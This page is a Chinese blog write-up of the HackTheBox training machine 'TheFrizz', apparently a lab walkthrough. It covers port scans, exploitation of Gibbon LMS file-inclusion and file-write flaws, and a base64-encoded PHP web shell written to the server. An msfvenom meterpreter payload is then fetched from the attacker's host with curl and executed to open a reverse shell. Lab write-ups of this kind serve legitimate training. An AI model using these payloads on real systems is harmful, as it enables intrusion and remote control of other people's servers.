<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog - 记录学习、生活" data-next-head=""/><meta property="og:description" content="Sunset的个人博客" data-next-head=""/><meta property="og:url" content="http://sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="http://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="http://sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><title data-next-head="">HackTheBox - Season7-TheFrizz</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="http://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="http://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/c16f7e2b105eef61.css" as="style"/><link rel="stylesheet" href="/_next/static/css/c16f7e2b105eef61.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-8cac0b4b405cede1.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-4b638ff538b97055.js" defer=""></script><script src="/_next/static/chunks/999-39f23ad0a9336d72.js" defer=""></script><script src="/_next/static/chunks/525-0d15655fabd4a1e0.js" defer=""></script><script src="/_next/static/chunks/pages/%5Byear%5D/%5Bmonth%5D/%5Bday%5D/%5Bid%5D-87d35e113019ad3d.js" defer=""></script><script src="/_next/static/3utQ6Fx9dsgm1XbZvmWuw/_buildManifest.js" defer=""></script><script src="/_next/static/3utQ6Fx9dsgm1XbZvmWuw/_ssgManifest.js" defer=""></script></head><body><link rel="preload" as="image" href="/images/logo.png"/><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 flex flex-col min-h-screen font-[LXGWWenKai]"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><img src="/images/logo.png" alt="Sunset" class="md:size-18 md:block hidden rounded-full"/><div><div class="flex items-center justify-center md:justify-start"><img src="/images/logo.png" alt="Sunset" class="size-10 rounded-xl md:hidden"/><h1 class="md:text-3xl text-xl font-extrabold text-red-700 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full relative"><div class="flex justify-center"><article class="w-full md:w-3xl px-3 mt-5 md:mt-15"><h1 class="text-xl md:text-2xl font-bold text-red-700">HackTheBox - Season7-TheFrizz</h1><div class="flex flex-col"><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 md:text-base">SUNSET</p><p class="font-thin text-gray-600 ml-2 md:text-base">2025-04-04</p><p class="font-thin text-gray-600 ml-2 md:text-base">(Updated:<!-- -->2025-04-04<!-- -->)</p></div><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 md:text-base">Category:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700">靶机</span></div><div class="flex flex-wrap text-sm mt-1"><p class="font-bold text-gray-600 md:text-base">Tags:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700">HackTheBox</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700">域渗透</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700">Windows靶机</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700">encrypt</span></div></div><div class="my-8 text-center">加载中...</div></article></div></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"HackTheBoxSeason7-TheFrizz","contentHtml":"\u003ch1\u003eSeason7-TheFrizz\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://app.hackthebox.com/machines/652\"\u003ehttps://app.hackthebox.com/machines/652\u003c/a\u003e | \u003ccode\u003emedium\u003c/code\u003e | \u003ccode\u003eWindows\u003c/code\u003e靶机\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2\u003e前期踩点\u003c/h2\u003e\n\u003cp\u003e进行\u003ccode\u003enmap\u003c/code\u003e扫描\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/TheFrizz  nmap -sT -min-rate 10000 -p- 10.10.11.60     \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-16 10:52 EDT\nStats: 0:00:44 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan\nConnect Scan Timing: About 31.29% \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e; ETC: 10:54 (0:01:23 remaining)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.10.11.60\nHost is up (0.21s latency).\nNot shown: 65515 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n22/tcp    open  ssh\n53/tcp    open  domain\n80/tcp    open  http\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n9389/tcp  open  adws\n49664/tcp open  unknown\n49668/tcp open  unknown\n49670/tcp open  unknown\n57439/tcp open  unknown\n57443/tcp open  unknown\n57453/tcp open  unknown\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e发现域名\u003ccode\u003efrizzdc.frizz.htb\u003c/code\u003e 添加到\u003ccode\u003ehosts\u003c/code\u003e 文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/TheFrizz  nmap -sT -A -T4 -O -p 22,53,80,88,135,139,389,445,593,636,3268,3269,9389 10.10.11.60\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-16 10:57 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.10.11.60\nHost is up (0.25s latency).\n\nPORT     STATE SERVICE       VERSION\n22/tcp   open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)\n53/tcp   open  domain        Simple DNS Plus\n80/tcp   open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)\n|_http-title: Did not follow redirect to http://frizzdc.frizz.htb/home/\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e: 2025-03-16 21:39:50Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)\n445/tcp  open  microsoft-ds?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  tcpwrapped\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)\n3269/tcp open  tcpwrapped\n9389/tcp open  mc-nmf        .NET Message Framing\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2022 (89%)\nAggressive OS guesses: Microsoft Windows Server 2022 (89%)\nNo exact OS matches \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e host (\u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Hosts: localhost, FRIZZDC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n| smb2-time: \n|   \u003cspan class=\"hljs-built_in\"\u003edate\u003c/span\u003e: 2025-03-16T21:40:19\n|_  start_date: N/A\n|_clock-skew: 6h41m46s\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   197.91 ms 10.10.16.1\n2   271.29 ms 10.10.11.60\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 85.70 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e漏洞扫描\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/TheFrizz  nmap -script=vuln -p 22,53,80,88,135,139,389,445,593,636,3268,3269,9389 10.10.11.60\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-16 11:01 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e frizz.htb (10.10.11.60)\nHost is up (0.26s latency).\n\nPORT     STATE SERVICE\n22/tcp   open  ssh\n53/tcp   open  domain\n80/tcp   open  http\n|_http-dombased-xss: Couldn\u003cspan class=\"hljs-string\"\u003e't find any DOM based XSS.\n| http-slowloris-check: \n|   VULNERABLE:\n|   Slowloris DOS attack\n|     State: LIKELY VULNERABLE\n|     IDs:  CVE:CVE-2007-6750\n|       Slowloris tries to keep many connections to the target web server open and hold\n|       them open as long as possible.  It accomplishes this by opening connections to\n|       the target web server and sending a partial request. By doing so, it starves\n|       the http server'\u003c/span\u003es resources causing Denial Of Service.\n|       \n|     Disclosure \u003cspan class=\"hljs-built_in\"\u003edate\u003c/span\u003e: 2009-09-17\n|     References:\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750\n|_      http://ha.ckers.org/slowloris/\n|_http-stored-xss: Couldn\u003cspan class=\"hljs-string\"\u003e't find any stored XSS vulnerabilities.\n|_http-csrf: Couldn'\u003c/span\u003et find any CSRF vulnerabilities.\n| http-enum: \n|_  /home/: Potentially interesting folder\n88/tcp   open  kerberos-sec\n135/tcp  open  msrpc\n139/tcp  open  netbios-ssn\n389/tcp  open  ldap\n445/tcp  open  microsoft-ds\n593/tcp  open  http-rpc-epmap\n636/tcp  open  ldapssl\n|_ssl-ccs-injection: No reply from server (TIMEOUT)\n3268/tcp open  globalcatLDAP\n3269/tcp open  globalcatLDAPssl\n|_ssl-ccs-injection: No reply from server (TIMEOUT)\n9389/tcp open  adws\n\nHost script results:\n|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR\n|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR\n|_smb-vuln-ms10-054: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 324.48 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e先尝试\u003ccode\u003eSMB\u003c/code\u003e是否允许匿名用户\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/TheFrizz  smbclient -L 10.10.11.60 -U anonymous\nsession setup failed: NT_STATUS_NOT_SUPPORTED\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eWEB 渗透\u003c/h2\u003e\n\u003cp\u003e访问HTTP服务，貌似是一个教育平台\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-TheFrizz/image44.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e在主页下面发现，一串\u003ccode\u003ebase64\u003c/code\u003e编码的文字\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-TheFrizz/image45.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e对其进行解码\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-TheFrizz/image46.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e翻译下来就是：想学习黑客技术但又不想坐牢？您将在国际水域的安全环境中了解 Syscalls 和 XSS 的来龙去脉，并了解客户签订的铁定合同，这些内容均由 Walkerville 最优秀的律师审阅。\u003c/p\u003e\n\u003cp\u003e提到了\u003ccode\u003eSyscalls\u003c/code\u003e 和 \u003ccode\u003eXSS\u003c/code\u003e ，但不知道有什么用，后面可能会用到\u003c/p\u003e\n\u003cp\u003e头部上有 \u003ccode\u003eStaff login\u003c/code\u003e ，点击跳转\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-TheFrizz/image47.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\nWelcome\n\n*NOTICE** Due to unplanned Pentesting by students, WES is migrating applications and tools to stronger security protocols. During this transition, Ms. Fiona Frizzle will be migrating Gibbon to utilize our Azure Active Directory SSO. Please note this might take 48 hours \u003cspan class=\"hljs-built_in\"\u003ewhere\u003c/span\u003e your accounts will not be available. Please bear with us, and thank you \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e your patience. Anything that can not utilize Azure AD will use the strongest available protocols such as Kerberos.\n欢迎\n\n*注意** 由于学生进行计划外的渗透测试，WES 正在将应用程序和工具迁移到更强大的安全协议。在此过渡期间，Fiona Frizzle 女士将迁移 Gibbon 以利用我们的 Azure Active Directory SSO。请注意，这可能需要 48 小时，在此期间您的帐户将不可用。请耐心等待，感谢您的耐心。任何无法使用 Azure AD 的东西都将使用最强大的可用协议，例如 Kerberos。\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e左边选项是学生申请，右边是员工申请\u003c/p\u003e\n\u003cp\u003e我们可以知道这里是使用\u003ccode\u003eGibbon v25\u003c/code\u003e搭建的，通过网上搜寻是否存在漏洞\u003c/p\u003e\n\u003cp\u003e经搜索存在本地文件包含漏洞 \u003cstrong\u003eCVE-2023-34598\u003c/strong\u003e：\u003ca href=\"https://github.com/maddsec/CVE-2023-34598\"\u003ehttps://github.com/maddsec/CVE-2023-34598\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e但是，需要注意的是，此漏洞仅对位于安装文件夹中的文件和特定条件有效，例如，不包括 PHP 文件\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e我们参照\u003ccode\u003ePOC\u003c/code\u003e进行本地文件包含\u003ccode\u003egibbon.sql\u003c/code\u003e ，成功复现\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-TheFrizz/image48.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e对当前安装目录进行扫描，寻找是否存在能进行包含的敏感文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/TheFrizz  gobuster \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e -u http://frizzdc.frizz.htb/Gibbon-LMS/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 404,403,502,429 --no-error -x php,asp,zip,txt\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) \u0026#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://frizzdc.frizz.htb/Gibbon-LMS/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404,403,502,429\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,asp,zip,txt\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e directory enumeration mode\n===============================================================\n/index.php            (Status: 200) [Size: 22064]\n/login.php            (Status: 302) [Size: 0] [--\u003e /Gibbon-LMS/index.php?loginReturn=fail0]\n/resources            (Status: 301) [Size: 361] [--\u003e http://frizzdc.frizz.htb/Gibbon-LMS/resources/]\n/themes               (Status: 301) [Size: 358] [--\u003e http://frizzdc.frizz.htb/Gibbon-LMS/themes/]\n/modules              (Status: 301) [Size: 359] [--\u003e http://frizzdc.frizz.htb/Gibbon-LMS/modules/]\n/uploads              (Status: 301) [Size: 359] [--\u003e http://frizzdc.frizz.htb/Gibbon-LMS/uploads/]\n/version.php          (Status: 200) [Size: 0]\n/privacypolicy.php    (Status: 200) [Size: 524]\n/report.php           (Status: 200) [Size: 2617]\n/Index.php            (Status: 200) [Size: 22064]\n/license              (Status: 200) [Size: 35113]\n/lib                  (Status: 301) [Size: 355] [--\u003e http://frizzdc.frizz.htb/Gibbon-LMS/lib/]\n/src                  (Status: 301) [Size: 355] [--\u003e http://frizzdc.frizz.htb/Gibbon-LMS/src/]\n/update.php           (Status: 200) [Size: 660]\n/Login.php            (Status: 302) [Size: 0] [--\u003e /Gibbon-LMS/index.php?loginReturn=fail0]\n/Resources            (Status: 301) [Size: 361] [--\u003e http://frizzdc.frizz.htb/Gibbon-LMS/Resources/]\n/PrivacyPolicy.php    (Status: 200) [Size: 524]\n/logout.php           (Status: 302) [Size: 0] [--\u003e /Gibbon-LMS/index.php]\n/preferences.php      (Status: 200) [Size: 374]\n/changelog.txt        (Status: 200) [Size: 103023]\n/ChangeLog.txt        (Status: 200) [Size: 103023]\n/Themes               (Status: 301) [Size: 358] [--\u003e http://frizzdc.frizz.htb/Gibbon-LMS/Themes/]\n/vendor               (Status: 301) [Size: 358] [--\u003e http://frizzdc.frizz.htb/Gibbon-LMS/vendor/]\n/config.php           (Status: 200) [Size: 0]\n/error.php            (Status: 200) [Size: 2845]\n/LICENSE              (Status: 200) [Size: 35113]\n/privacyPolicy.php    (Status: 200) [Size: 524]\n/functions.php        (Status: 200) [Size: 0]\n/INDEX.php            (Status: 200) [Size: 22064]\n/License              (Status: 200) [Size: 35113]\n/Modules              (Status: 301) [Size: 359] [--\u003e http://frizzdc.frizz.htb/Gibbon-LMS/Modules/]\n/CHANGELOG.txt        (Status: 200) [Size: 103023]\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e扫描过于慢，可能是不需要进行爆破，暂时没有读到任何有效的文件\u003c/p\u003e\n\u003cp\u003e然后在网上可以找到（\u003ccode\u003eintext:Arbitrary File Write gibbon\u003c/code\u003e）：\u003ca href=\"https://herolab.usd.de/security-advisories/usd-2023-0025/\"\u003ehttps://herolab.usd.de/security-advisories/usd-2023-0025/\u003c/a\u003e 另外一个任意文件写入的漏洞\u003c/p\u003e\n\u003cp\u003e验证POC：\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThe following request will write the payload \u003cstrong\u003e\u003c/strong\u003e to the file \u003cstrong\u003easdf.php\u003c/strong\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ePOST /modules/Rubrics/rubrics_visualise_saveAjax.php HTTP/1.1\nHost: localhost:8080\n[...]\n\nimg=image/png;asdf,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKT8%2b\u0026#x26;path=asdf.php\u0026#x26;gibbonPersonID=0000000001\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e构造Payload：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ecurl -X POST -d \u003cspan class=\"hljs-string\"\u003e\"img=image/png;asdf,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKT8%2b\u0026#x26;path=asdf.php\u0026#x26;gibbonPersonID=0000000001\"\u003c/span\u003e http://frizzdc.frizz.htb/Gibbon-LMS//modules/Rubrics/rubrics_visualise_saveAjax.php\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e访问\u003ccode\u003easdf.php\u003c/code\u003e 并添加\u003ccode\u003ecmd\u003c/code\u003e参数，成功回显！\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-TheFrizz/image49.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e将\u003ccode\u003eshell\u003c/code\u003e弹到\u003ccode\u003eMSF\u003c/code\u003e上\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emsfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.16.54 lport=1234 -f exe -o getshell.exe\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e开启监听\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emsf6 \u003e use exploit/multi/handler \n[*] Using configured payload generic/shell_reverse_tcp\nmsf6 exploit(multi/handler) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e payload windows/x64/meterpreter/reverse_tcp\npayload =\u003e windows/x64/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) \u003e options\n\nPayload options (windows/x64/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          \u003cspan class=\"hljs-built_in\"\u003eyes\u003c/span\u003e       Exit technique (Accepted: \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e, seh, thread, process, none)\n   LHOST                      \u003cspan class=\"hljs-built_in\"\u003eyes\u003c/span\u003e       The listen address (an interface may be specified)\n   LPORT     4444             \u003cspan class=\"hljs-built_in\"\u003eyes\u003c/span\u003e       The listen port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Wildcard Target\n\nView the full module info with the info, or info -d \u003cspan class=\"hljs-built_in\"\u003ecommand\u003c/span\u003e.\n\nmsf6 exploit(multi/handler) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e lhost 10.10.16.54\nlhost =\u003e 10.10.16.54\nmsf6 exploit(multi/handler) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e lport 1234\nlport =\u003e 1234\nmsf6 exploit(multi/handler) \u003e run\n\n[*] Started reverse TCP handler on 10.10.16.54:1234 \n\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e下载\u003ccode\u003epayload\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ehttp://frizzdc.frizz.htb/Gibbon-LMS/asdf.php?cmd=curl 10.10.16.54:8081/getshell.exe -o ./getshell.exe\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e执行恶意\u003ccode\u003eexe\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ehttp://frizzdc.frizz.htb/Gibbon-LMS/asdf.php?cmd=getshell.exe\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e成功上线\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emsf6 exploit(multi/handler) \u003e run\n\n[*] Started reverse TCP handler on 10.10.16.54:1234 \n[*] Meterpreter session 1 opened (10.10.16.54:1234 -\u003e 10.10.11.60:55047) at 2025-03-17 00:55:40 -0400\n\nmeterpreter \u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e靶机信息搜集\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emeterpreter \u003e \u003cspan class=\"hljs-built_in\"\u003epwd\u003c/span\u003e\nC:\\xampp\\htdocs\\Gibbon-LMS\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emeterpreter \u003e sysinfo\nComputer        : FRIZZDC\nOS              : Windows Server 2022 (10.0 Build 20348).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : frizz\nLogged On Users : 